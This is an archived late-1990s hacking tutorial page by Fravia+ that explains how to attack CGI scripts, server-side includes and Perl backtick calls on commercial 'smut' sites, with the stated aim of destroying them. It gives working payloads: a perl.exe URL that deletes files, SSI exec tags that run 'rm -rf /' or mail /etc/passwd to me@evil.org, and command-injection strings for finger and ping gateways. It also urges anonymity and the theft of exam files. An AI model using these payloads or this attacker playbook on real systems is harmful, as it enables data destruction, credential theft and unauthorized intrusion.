@@ -1,0 +1,1182 @@
+<HTML>
+
+<HEAD>
+
+<TITLE>ideale4</TITLE>
+
+</HEAD>
+
+<BODY BGCOLOR=#C0C0C0 TEXT=#001010 VLINK=#405040>
+
+<A NAME="anchortop"></A>
+
+<!-- Begin Introdo -->
+
+<CENTER>
+
+<A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm"><IMG SRC="antism.gif" tppabs="http://www.anticrack.de/fravia/antism.gif" ALT="No_commercial!" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A>
+
+<BR>
+
+<FONT color=gray>Crackers against Smut</FONT>
+
+
+
+</CENTER>
+
+<H1>
+
+<FONT size=+5>
+
+<CENTER>Fravia's <FONT color=red>CGI-script reversing</FONT><BR>page TWO</FONT></CENTER></H1>
+
+<CENTER>
+
+<B>(CGI Security and CGI Insecurity)</B><BR>
+
+~<BR>
+
+<B>(How to exploit CGI-script, server side includes and perl ticks)</B><BR>
+
+(How to see a smut site going Ka-boom! under your very eyes)<BR>
+
+<BR>~<BR>
+
+By Fravia+, Started <FONT color=red>27 November 1997</FONT><BR>Page severely under construction... 
+
+SEND MORE CONTRIBUTIONS!
+
+</CENTER><BR><HR size=2>
+
+<!-- Begin whatwewant --><I><CENTER>
+
+Well all this is more hacking than cracking, yet we'll try to bring 
+
+everything inside a sound cracker perspective... some hacking knowledge 
+
+is required anyway, so acquire it, here some information (edited and integrated) 
+
+from Eugene Kim (who knows) and myself (who guesses).
+
+</I></CENTER><BR>
+
+<P>
+
+<FONT size=+2>Our main aims</FONT><BR>
+
+<BR>
+
+Well, we want to destroy, or lame, or at least damage commercially  all 
+
+commercial oriented sites that are pestering the Web.<BR> 
+
+Therefore we want, more or less, the following:
+
+<PRE>*)	know which server operating system they are using
+
+*)	know which CGI-language they are using (compiled or interpreted)
+
+*)	know WHERE their CGI-scripts are, how they work and what they do
+
+*)	gain information about their directory structure
+
+*)	gain information about their server configuration
+
+*)	gain access to the source code of their CGI-scripts
+
+*)	introduce our own scripts (trough various tricks)
+
+*)	gain access to their server configuration files
+
+*)	fuck completely and if possible irrimediably the whole site</PRE></P>
+
+<FONT size=+2>Which operating system are more easy to bust?</FONT><BR>
+
+<BR>
+
+<P>No operating system is more secure than another. The ones that 
+
+say such things are just probably trying to sell (or have just bought) a 
+
+specific operating system.<BR> 
+
+Yet UNIX is arguably more secure than a single-user platform such 
+
+as a Macintosh or a PC running Windows, because once you break into 
+
+one of these latter machines, you can access all the files :-)<BR> 
+
+UNIX, however, has a fundamental understanding of file ownerships and
+
+permissions. Yet even if the target server is configured so that it 
+
+is owned by a safe (for example, non-root) user, which is the best 
+
+option that the sysad can choose, and even if, then, we can do only 
+
+limited damage breakÌng in, this same limited damage, however, can
+
+be bad enough, as you will see in my examples, later in this
+
+chapter.</P>
+
+
+
+<P>On the other hand, because UNIX often comes preconfigured with many
+
+different types of network services such as mail, FTP, Gopher, WWW,
+
+and so on, there are more potential &quot;doors&quot; for someone to
+
+enter. Securing all of these services is a difficult and
+
+time-consuming process, even for the few experienced administrators around, 
+
+that's the reason they don't actually check them all too often :-) 
+
+And even if they configure everything "correctly" (from their point of view), 
+
+they are still at the mercy of the many bugs that exist in each 
+
+individual commercial package.<BR>
+
+Security flaws in various packages are very common, as is clear from 
+
+the frequency of notices about insecurities... just have a  look at the
+
+Computer Emergency Response Team (CERT) site (which you should by all 
+
+means peruse and study :-)</P>
+
+
+
+<P>Every different platform has its own different security
+
+implications, but one is not more secure than another. In order 
+
+to <FONT color=red>begin</FONT> approaching this kind of 
+
+activities,  remember that there are a countless number of Web servers 
+
+available for a variety
+
+of platforms. As a rule of thumb: the older and more frequently used the Web server, 
+
+the more
+
+likely security bugs have been found and yet have NOT been fixed.<BR>
+
+You may not believe it, but the 'snowball' effect inside the Web makes 
+
+it possible that VERY WELL KNOWN and DEEPLY STUDIED AND ADVERTISED bugs 
+
+and backdoors are STILL THERE!<BR>Therefore study, read, study and read.</P>
+
+
+
+<P>Read
+
+what people on the various Web Usenet newsgroups have to say about
+
+each product and its authors or publishers. Read the various security 
+
+alerts from organizations
+
+such as CERT and CIAC (Computer Incident Advisory Capability). Monitor the 
+
+best hacker sites (you'll be able to find most of them even if your search start  
+
+from my few hacker <A href="links.htm" tppabs="http://www.anticrack.de/fravia/links.htm">links</A>, yet you better use -wisely- a 
+
+couple of search engines for this endeavour :-)<BR>
+
+Study the servers' code if it is freely
+
+available... which is the RULE for the most popular servers... that's the very  
+
+reason they are so popular! I have fetched  
+
+the whole Apache libraries recently on a discount magazine cover cd-rom... 
+
+without even 
+
+the need to download them and clutter my harddisks :-)<BR>So, if the code is freely
+
+available, look through the
+
+source code yourself and see if you can find a new potential hole. Most of the time 
+
+you will... the more complex and powerful the server, the more
+
+likely there is an undetected security hole... and most new 'hurried up' sites, like 
+
+many of the commercial smut ones, have chosen the 'last server frill' instead 
+
+of using good old NCSA :-)</P>
+
+
+
+<P>
+
+<FONT size=+2>CGIs, where are you?</FONT><BR>
+
+<BR>
+
+<P>As discussed earlier in <A href="ideale3.htm" tppabs="http://www.anticrack.de/fravia/ideale3.htm">cgi-script reversing page one</A>; most Web
+
+servers enable you to run CGI programs in many different ways. For
+
+example, they could have designatet a specific directory as user
+
+cgi-bin. Alternatively, they could allow CGI to be stored in any
+
+user directory (i.e. in almost any directory)</P>
+
+
+
+<P>There are advantages and disadvantages to both, from a security
+
+standpoint, it is better to designate one directory to store all 
+
+ CGI applications. Having all CGI programs in one directory
+
+makes it easier for lazy sysadmins to keep track of all 
+
+of the applications on their  
+
+server and to audit them for potential security holes. It also helps
+
+them to prevent our tampering: if the scripts are located in several different
+
+directories, they need to constantly check each one of these for
+
+our tampering activities :-)</P>
+
+
+
+<P>If our target uses a scripting language (such as Perl) for most of
+
+its applications, then the source code is contained within the
+
+application itself. This code, then, is potentially vulnerable to
+
+being read, and exploited, if the sysads of the target have not been 
+
+extremely careful!<BR>
+
+There are very simple attempts that you can try yourself in order to get the 
+
+source code of the CGI-scripts (once you know their names, have seen 
+
+how they work and what they do and having decided which one are 
+
+potentially the most useful ones to be used as "Troian horses")<BR>
+
+For example, many
+
+text editors save backup files, usually appending some extension to
+
+the end of the filename (such as .bak).<BR>
+
+For example, many
+
+operating system create temporary files, usually appending some extension to
+
+the end of the filename (such as .tmp) and preceding the filename with a ~ (such as 
+
+~wrl0001.tmp).</P>
+
+
+
+<P>For example, emacs saves backup files with the extension
+
+filename~. Suppose that there is a CGI script written in
+
+Perl&#151;program.cgi&#151;stored in one of the Web data directories
+
+rather than in a central designated directory. Now suppose that the sysadm 
+
+has made a trivial change to the program using emacs and forgot to remove
+
+the backup file. You now have two files in your target directory: program.cgi
+
+and program.cgi~. The Web server knows that files ending in .cgi are
+
+CGI programs and will run the program rather than display its
+
+content (yet we'll see how to get those files 'sended over' too). 
+
+However, a smart cracker might try to access program.cgi~
+
+instead. Because it does not end in .cgi, the target Web server sends it as
+
+a raw text file, thus allowing the cracker to search at leisure the CGI source code for
+
+possible holes!</P>
+
+
+
+<P>However, if the target server specifies all files located in
+
+a certain directory as a CGI, it doesn't matter what the extension of
+
+the file is. So in the same example earlier, if the backup file were
+
+located in a properly designated directory (the cgi one, as opposed to 
+
+some user's 'perypheric' directory) and a cracker tried to access
+
+it, the server would try to run the program EVEN WITH ITS EXTENSION "<FONT color=red>cgi~</FONT>" 
+
+rather than send over to us the
+
+source code.</P>
+
+
+
+<P>You may ask why the sysads don't do it routinely... well: designating a 
+
+central directory as the location of all
+
+CGI programs on a server is extremely limiting, especially on a multiuser
+
+system. For example, all Internet Service Provider 
+
+want to allow their users to write and run their own CGI, for concurrence reasons, and are 
+
+inclined to allow CGI to be stored in any directory.<BR>Usually sysads allow
+
+ spreaded CGI-depositories <FONT color=red>if their clients are
+
+going to be writing a lot of special customized scripts</FONT>!<BR>That 
+
+suits us well: commercial smut dealers (and commercial advertisers too 
+
+for that matter) are the most prolific writers of special customized scripts 
+
+that you can find around :-)</P>
+
+
+
+<P>Another issue regarding the location of CGI programs is where did they 
+
+put the interpreter. For interpreted scripts, the server runs the
+
+interpreter, which in turn loads the script and executes it.</P>
+
+
+
+<P>Unfortunately the interpreter is seldom located inside the target 
+
+cgi-bin directory (or in any
+
+directory of our targets' data trees for that matter).<BR>Giving us access to
+
+the interpreter essentially gives us the power to run any
+
+application or any series of commands on the target system.<BR>
+
+I remember early days, when I could bust a lot of commercial sites 
+
+that way... now it happens seldom, yet occasionally it does and that's 
+
+real fun! The whole target goes KA-boom! under your very eyes!</P>
+
+
+
+<P>This is more easy if the target uses a Windows or other non-UNIX
+
+operating system, as it happens ofter and ofter nowadays :-)<BR>
+
+In UNIX, they specify the interpreter in the
+
+first line of their scripts. For example:</P>
+
+
+
+<PRE>
+
+#!/usr/local/bin/perl
+
+# this first line says use Perl to run the script that follows
+
+...
+
+</PRE>
+
+
+
+<P>In Windows, for example, there is no analogous method of specifying
+
+the interpreter within the script. One way to call a Perl script would
+
+be to create a batch file that calls Perl <U>and</U> the script:</P>
+
+
+
+<PRE>
+
+rem progname.bat
+
+rem a wrapper for my perl script, progname.pl
+
+c:\perl\perl.exe progname.pl
+
+...
+
+</PRE>
+
+
+
+<P>However, they often avoid creating this extra program
+
+by simply putting perl.exe in their cgi-bin directory and accessing the
+
+following URL:</P>
+
+
+
+<PRE>
+
+http://hostname/cgi-bin/perl.exe?progname.pl
+
+</PRE>
+
+
+
+<P>AS soon as you see something like this perusing the web you know that 
+
+a VERY big fish has bited! The above method works orright, but it also 
+
+enables anyone in the world to run any Perl
+
+command on that machine.</P> 
+
+Access imemdiately, for example, the following URL in your target machine:</P>
+
+<FONT color=red><PRE>
+
+http://hostname/cgi-bin/perl.exe?-e+unlink+%3C*.*%3E%3B
+
+</FONT></PRE>
+
+
+
+<P>Decoded, the previous line is equivalent to calling Perl and
+
+running the following one-line program, which will delete all the
+
+files in the current directory.</P>
+
+
+
+<PRE>
+
+unlink &lt;*.*&gt;;
+
+</PRE>
+
+
+
+
+
+<P> Clearly, this is great fun (and it is only a 
+
+very 'quiet' example... download the Perl Camel book and learn a little 
+
+Perl... THAT will give some pepper to your web perusing activities :-)</P>
+
+<P>Some Windows servers can determine the type of script by its
+
+extension and run the appropriate interpreter. For example, Win-HTTPD
+
+assumes every CGI script ending in .pl is a Perl script and will run
+
+Perl automatically.</P>
+
+
+
+
+
+<HR>
+
+<P>
+
+<FONT size=+2>SSI strategic simulation? No: server-side include!</FONT><BR>
+
+<BR>
+
+
+
+
+
+
+
+<P>By allowing server-side include, commercial smut sites offer some 
+
+attack points.<BR>On a UNIX
+
+machine, the programs are run by the owner of the server, not the
+
+owner of the program. If the target server isn't "properly" configured and there 
+
+are sensitive files or programs owned by the server owner, as it happens 
+
+frequently, these
+
+files and programs, <U>and their output</U>, become accessible for us</P>
+
+
+
+<P>This is even more feasible if they allow users to edit HTML files on their 
+
+systems from Web browsers!<BR>
+
+A common example of this is a
+
+<I>guestbook</I>. In a guestbook, users fill out a form and submit
+
+messages to a CGI program, which will often simply append the unedited
+
+message to an HTML file, the guestbook itself.<BR>By not editing or filtering
+
+the submitted message, they allow the user to submit HTML code from his browser. 
+
+If they allow programs to be executed in a server-side
+
+include, we can wreak havoc to our target machines by
+
+submitting a tag like the following:</P>
+
+
+
+<PRE>
+
+&lt;!--#exec cmd=&quot;/bin/rm -rf /&quot;--&gt;
+
+</PRE>
+
+
+
+<P>This server-side include is very useful for smut-sites bashing: it will 
+
+attempt to delete everything it can on the target machine.</P>
+
+
+
+<P>Note that the sysads try to prevent this problem in several ways
+
+without having to completely turn off server-side includes. They try to 
+
+filter out all HTML tags before appending the submitted text to
+
+the guestbooks. Or they disable the exec capability of our 
+
+server-side include.</P>
+
+
+
+<P>Attacking should not be made in a hurry, anyway, it is often more clever to 
+
+profit of these first 'breaks' in order to gain even more information, in order to 
+
+destriy even better the target smut site!
+
+<BR>Suppose that instead of attempting to delete everything on the smut site's 
+
+disks, we attempt to obtain the sysads <FONT color=red>/etc/passwd</FONT> for
+
+hopeful cracking purposes... using something like the following:</P>
+
+
+
+<PRE>		&lt;!--#exec cmd=&quot;/bin/mail me@evil.org &lt; /etc/passwd&quot;--&gt;</PRE>
+
+
+
+<P>This examples demonstrate a VERY IMPORTANT TRUTH about both
+
+server-side includes and CGI in general: Security holes can be
+
+completely hidden. Few people know that a simple guestbook
+
+program on a system with server-side includes poses a large security
+
+risk!<BR>Besides a 'normal' server has at least 100 different CGI-scripts 
+
+written by not less than 25-30 different authors!<BR>Social engineering can 
+
+also help a lot... most authors brag about their (pathetical) CGI-scripts, with 
+
+source code and everything, on their own homepages!</P>
+
+
+
+<P>So, we have seen some very complicated ways to access the cgi-source, yet 
+
+with HTTP it is trivial to bypass a form (or even the browser) and remotely 
+
+access the SCRIPT directly from the COMMAND LINE of your workstation.<BR>
+
+<PRE>telnet www80
+
+connect www.slac.stanford.edu   ;special site for demonstration purposes
+
+escape character is '^]'
+
+			GET /cgi-bin/pingre?foo;mail+hcu4412@hotmail.com</PRE>
+
+You dig it? It would be a good idea to try routinely not only telnet, but also 
+
+all other 'forotten' services: ftp, tftp, nntp, bootp...<BR>Of course the directories 
+
+that you should try to investigate (if NFS mount has not been turned off) are first of all 
+
+cgi-bin; cgi-wrap; tmp; public_html...<BR>Directory indexing is mostly disabled 
+
+through a very simple trick: they put an empty index.html file inside a directory, 
+
+there are a few easy way to get around this, as you should be able to understand 
+
+by yourself :-)</P>
+
+
+
+<P>A common way to control access to files is based on the IP access control (say 
+
+restrictin access to nodes with IP address= 210.56.*.* yet this cannot work for the smut 
+
+sites, which are struggling to get lusers from wherever they come. A good idea is, 
+
+anyway, to bang around the web using a <I>dynamic</I> IP provider (a multi user host 
+
+like AOL or Compuserve, or 
+
+whatever), that will not cost you anything at all (see 
+
+<A href="noanon.htm#anchoranoaca" tppabs="http://www.anticrack.de/fravia/noanon.htm#anchoranoaca"><IMG SRC="anon1.gif" tppabs="http://www.anticrack.de/fravia/anon1.gif" 
+
+ALT="noanon" ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 
+
+VSPACE=0 HSPACE=0></A> for information about free anonymous web surfing)  
+
+and is very seldom IP-restricted, for obvious reasons.</P>
+
+
+
+<P>Most smut sites (most sites for that matter :-) have a list of 'authorized' 
+
+users each with an assigned user name and password, as we have seen, some servers 
+
+also support groups of users. When a protected file or image or directory is 
+
+accessed, the browser pops up a dialog box asking for the user name and password, and 
+
+gives access if valid, else throws up an 'authorization failed' URL.<BR>
+
+Yet:<PRE>
+
+-	There is a significant administration overhead for maintaining such 
+
+	lists, and therefore these lists are NOT updated all too often...
+
+-	Stupid user park must remember these passwords and tend to use the same 
+
+	schemes (see <A href="general.htm" tppabs="http://www.anticrack.de/fravia/general.htm">a general approach</A>) that are 
+
+	easy to guess. Automated password generation (that users dislike)
+
+	is also fairly easy to crack :-)
+
+-	Most web servers allow an infinite number of guesses!
+
+-	Passwords are NOT encrypted (not even on military servers :-) and 
+
+	therefore are vulnerable to our sniffers</PRE></P>
+
+
+
+<P>This last point deserves some more information. Encryption on the web is a huge area, 
+
+and if you want to learn it really you'll be gone for the next three years (yet some 
+
+very good (and old) crackers have taken that path, let's hope they will bring 
+
+something back before they die :-).<BR>
+
+There are two current standards for REAL encryption:<BR>
+
+- Secure Socket Layer (SSL) from Netscape<BR>
+
+- S-HTTP from the CommerceNet coalition<BR>
+
+They both use pair of keys, a public one and a private one.<BR><BR>They work like PGP: you 
+
+encrypt a message with your private key and only people that know your public key can 
+
+decrypt the message AND know that it is yours, i.e. it is also like a signature.<BR>
+
+People encrypt messages with your public key and only you can decrypt them, since you 
+
+are the only one that knows his own private key.<BR>
+
+<BR><FONT size=+1>SSL Connection ping-pong:</FONT>
+
+<BR>- browser connects to server via HTTPS
+
+<BR>- server sends back digital signature
+
+<BR>- browser verifies digital signature (signed by a trustworthy CA)
+
+<BR>- if OK browser generates a master key based on a random number, 
+
+encrypts with server's public key and sends to server
+
+<BR>- server decrypts master key trough its private key
+
+<BR>- browser and server generate session key based on master key and random 
+
+numbers and now have both an identical session key
+
+<BR>- data between browser and server is encrypted using said session key
+
+<BR><BR>
+
+Sounds impressive when you read it like that, doesn't it? And yet +ORC has already 
+
+cracked it :-)<BR>
+
+</P>
+
+<HR>
+
+<FONT size=+2>Perl ticks</FONT><BR>
+
+<P>Let's go back to some other CGI-script tricks... which are IMO great fun: time 
+
+to learn and use the <FONT color=red>Perl ticks</FONT>!<BR><BR>
+
+Observe the finger gateway written in Perl inside Kim's Listing below. 
+
+All this program is doing is allowing the user to specify a user and a host,
+
+and the CGI will finger the user at the host and display the
+
+results.</P>
+
+
+
+<P><B>Listing: finger.cgi.</B></P>
+
+
+
+<PRE>
+
+#!/usr/local/bin/perl
+
+# finger.cgi - an unsafe finger gateway
+
+require 'cgi-lib.pl';
+
+print &amp;PrintHeader;
+
+if (&amp;ReadParse(*in)) {
+
+  print &quot;&lt;pre&gt;\n&quot;;
+
+  print `/usr/bin/finger $in{'username'}`;
+
+  print &quot;&lt;/pre&gt;\n&quot;;
+
+}
+
+else {
+
+  print &quot;&lt;html&gt; &lt;head&gt;\n&quot;;
+
+  print &quot;&lt;title&gt;Finger Gateway&lt;/title&gt;\n&quot;;
+
+  print &quot;&lt;/head&gt;\n&lt;body&gt;\n&quot;;
+
+  print &quot;&lt;h1&gt;Finger Gateway&lt;/h1&gt;\n&quot;;
+
+  print &quot;&lt;form method=POST&gt;\n&quot;;
+
+  print &quot;&lt;p&gt;User@Host: &lt;input type=text name=\&quot;username\&quot;&gt;\n&quot;;
+
+  print &quot;&lt;p&gt;&lt;input type=submit&gt;\n&quot;;
+
+  print &quot;&lt;/form&gt;\n&quot;;
+
+  print &quot;&lt;/body&gt; &lt;/html&gt;\n&quot;;
+
+}
+
+</PRE>
+
+
+
+<P>At first glance, this might seem like a harmless finger
+
+gateway. There's no danger of a buffer overflow because it is written
+
+in Perl. It uses the complete pathname of the finger binary so the
+
+gateway can't be tricked into using a fake finger program. If the
+
+input is in an improper format, the gateway will return an error, but
+
+not one that can be manipulated by us.</P>
+
+
+
+<P>However, what if we try entering the following field:</P>
+
+
+
+<PRE>
+
+nobody@nowhere.org ; /bin/rm -rf /
+
+</PRE>
+
+
+
+<P>Work out how the following line of the perl script above will deal with our input:</P>
+
+
+
+<PRE>
+
+print `/usr/bin/finger $in{'username'}`;
+
+</PRE>
+
+
+
+<P>Because we are using back ticks (`), first it will spawn a shell.<BR>
+
+Then it will execute the following command:</P>
+
+
+
+<PRE>
+
+/usr/bin/finger nobody@nowhere.org ; /bin/rm -rf /
+
+</PRE>
+
+
+
+<P>What will this do? Imagine typing this in at the command line. It
+
+will wipe out all of the files and directories it can, starting from
+
+the root directory. OK: we assume that the rm command
+
+was in the /bin directory.We could also have assumed that rm
+
+was in the path. On
+
+a chrooted environment that does not have the rm binary located
+
+anywhere in the directory tree this would not have worked... however, both of 
+
+the guesses above are pretty reasonable guesses
+
+for the majority of UNIX machines, yet they are not global truths: 
+
+In reality, most Web environments are not chrooted,
+
+simply because it prevents the flexibility many people need in a Web
+
+server.<BR>This will also almost always work unless they have rendered 
+
+the semicolon (;) metacharacter harmless.</P>
+
+
+
+<P>Even if we could not remove all the files in a target smut site 
+
+because the server was not running as root, we could just as
+
+easily have tryed to input the following command, which would have e-mailed the
+
+/etc/passwd file to me@evil.org for our cracking pleasure :-)</P>
+
+
+
+<PRE>
+
+nobody@nowhere.org ; /bin/mail me@evil.org &lt; /etc/passwd
+
+</PRE>
+
+
+
+
+
+<P>This follows the same principle as above... by now you should be able 
+
+to understand how and why :-)<BR>
+
+
+
+Let's see another example: say you find (or suppose :-) a (poor) shell 
+
+script called "pinger" or whatever, inside the cgi-bin of your target 
+
+smut site, looking more or less like 
+
+this:<PRE>			#!bin/sh
+
+			host='ping -c 5 $1'</PRE>
+
+
+
+Now imagine futtering that with an argument 
+
+like:<PRE>			foo; mail hcu2234@hotmail.com &lt; /etc/passwd</PRE>
+
+And you can spend the weekend cracking the password file :-)</P>
+
+
+
+<P>As you can see, if such 
+
+holes slip
+
+past the sysads inside a simple CGI program, you can  be sure that they will never have 
+
+properly and
+
+securely configured their complicated UNIX system and Web server :-)</P>
+
+
+
+<P>Notice that the file you are 'asking' for does not have to be /etc/passwd... it 
+
+could be any file accessible to the server (including afs and nfs), like (for 
+
+instance) the drafts of the examination tests you would have to solve tomorrow at 
+
+your local university (and university servers are, if possible, even less 
+
+secured than the smut sites' ones :-)<BR>Knowledge -not money any more- means now power 
+
+my dears... we have entered a new age... get used to this.</P>
+
+
+
+<P>Notice that there are several more functions in Perl that spawn the
+
+shell than there are in C. It is not immediately obvious, even to the
+
+intermediate Perl programmers, that back ticks spawn a shell before
+
+executing the program. This is the alternative value of higher-level
+
+languages for cracking purposes, as we know from our software reversing studies: 
+
+our enemies mostly don't know what security 
+
+holes a function might cause
+
+because they don't necessarily know exactly what it does, don't forget that they 
+
+DON'T UNDERSTAND SOURCE CODE and have only access to some (biased) high level 
+
+languages books... but we do understand assembly, oh yes, we do! And we can beat them 
+
+black and blue every time we like...<BR>
+
+That is, we may, if we 
+
+study and experiment a lot... and if we will build on each other using the real strenght  
+
+of Internet: free non commercial team working! People coming from places that you 
+
+don't even know exist will help you to understand better than anybody else all 
+
+these complex matters in few weeks on 
+
+a "do ut des" basis!<BR>
+
+For an incredible example of the incredible MIGHT (in matters of software cracking) that the 
+
+Web allows, if non-commercial minds gather together and work for free on some projects,  
+
+see our <A href="student.htm" tppabs="http://www.anticrack.de/fravia/student.htm">students' essays</A> pages 
+
+!<BR>
+
+Yes: reading all this stuff here won't help you much, nor help me at all, unless you work on 
+
+this on your own AND CONTRIBUTE!<BR><CENTER>
+
+<FONT size=+2>Let's start a CGI-reverse engineering academy!</CENTER></FONT></P>
+
+
+
+<HR>
+
+
+
+
+
+
+
+<BR>
+
+<!-- End whatwewant -->
+
+<FONT size=+3><CENTER>
+
+Good luck, good hunt!<BR></FONT>
+
+</CENTER>
+
+
+
+<!-- Begin this section mover -->
+
+<HR ALIGN=CENTER WIDTH=100% SIZE=3><CENTER>
+
+<A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm"><IMG SRC="antism.gif" tppabs="http://www.anticrack.de/fravia/antism.gif" ALT="No_commercial!" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A>
+
+<BR>
+
+<FONT color=gray>Crackers against Smut</FONT>
+
+
+
+</CENTER>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm">Antismut main page</A> 
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="general.htm" tppabs="http://www.anticrack.de/fravia/general.htm">A general approach</A>
+
+<BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale1.htm" tppabs="http://www.anticrack.de/fravia/ideale1.htm">combing</A> i.e. how to find the 
+
+"commercial smut" sites
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale2.htm" tppabs="http://www.anticrack.de/fravia/ideale2.htm">source checking</A> i.e. how to exploit 
+
+their intrinsic weaknesses
+
+<BR>
+
+
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 BORDER=0 
+
+VSPACE=0 HSPACE=0><A href="ideale3.htm" tppabs="http://www.anticrack.de/fravia/ideale3.htm">cgi-script one</A> CGI-tricks, page 
+
+one
+
+<BR>
+
+<!-- End this section mover -->
+
+<HR ALIGN=CENTER WIDTH=100% SIZE=3>
+
+<!-- Begin  main mover -->
+
+<CENTER>
+
+<FONT size=+2>Fravia's main site</FONT>
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="index.html" tppabs="http://www.anticrack.de/fravia/index.html">homepage</A>   
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="orc.htm" tppabs="http://www.anticrack.de/fravia/orc.htm">+ORC</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm">anon</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="coumes.htm" tppabs="http://www.anticrack.de/fravia/coumes.htm">counter measures</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="tools.htm" tppabs="http://www.anticrack.de/fravia/tools.htm">tools</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="academy.htm" tppabs="http://www.anticrack.de/fravia/academy.htm">+HCU Academy</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="stalking.htm" tppabs="http://www.anticrack.de/fravia/stalking.htm">stalking</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="slaves.htm" tppabs="http://www.anticrack.de/fravia/slaves.htm">enslavement</A> 
+
+<BR> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="student.htm" tppabs="http://www.anticrack.de/fravia/student.htm">students' essays</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="cocktail.htm" tppabs="http://www.anticrack.de/fravia/cocktail.htm">cocktails</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="links.htm" tppabs="http://www.anticrack.de/fravia/links.htm">links</A> 
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="searengi.htm" tppabs="http://www.anticrack.de/fravia/searengi.htm">search_forms</A>  
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="info.htm" tppabs="http://www.anticrack.de/fravia/info.htm">mail_fravia+</A> 
+
+<BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN=BOTTOM WIDTH=13 HEIGHT=13 
+
+BORDER=0 VSPACE=0 HSPACE=0><A HREF="legal.htm" tppabs="http://www.anticrack.de/fravia/legal.htm">Is reverse engineering legal?</A> 
+
+</CENTER>
+
+<!-- End main mover -->
+
+
+
+
+
+</BODY>
+
+</HTML>
+
